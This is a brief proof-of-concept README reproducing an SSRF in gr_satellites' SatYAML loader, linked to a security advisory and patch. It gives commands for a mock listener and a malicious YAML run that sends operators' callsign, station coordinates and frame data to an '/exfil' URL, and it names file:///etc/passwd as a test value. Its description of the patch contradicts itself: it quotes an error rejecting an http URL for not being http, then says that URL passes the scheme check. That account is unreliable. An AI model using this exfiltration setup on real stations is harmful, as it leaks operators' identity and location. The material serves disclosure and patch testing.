# F104 PoC — SatYAML SIDS URL trust boundary

Two-terminal reproducer for the SSRF described in Advisory 8.

```
# Terminal 1
python3 mock_listener.py

# Terminal 2 (with v5.9.0 unpatched)
gr_satellites malicious_satellite.yml --wavfile any_sample.wav
```

Terminal 1 prints each POST it receives. With the unpatched build,
every successfully decoded frame produces an exfil line containing the
operator's callsign, station coordinates, and the RF hex of the frame.

After patch 0008-F104-satyaml-url-allowlist.patch, the same command
fails at YAML load:

```
YAMLError: SIDS URL must be http:// or https://, got: 'http://127.0.0.1:9104/exfil'
```

(127.0.0.1 still passes the scheme check; the patch deliberately stops
at the scheme allow-list and leaves loopback/RFC1918 filtering for the
operator. Replace the URL with `file:///etc/passwd` in the YAML to
show the loader rejects non-http(s).)
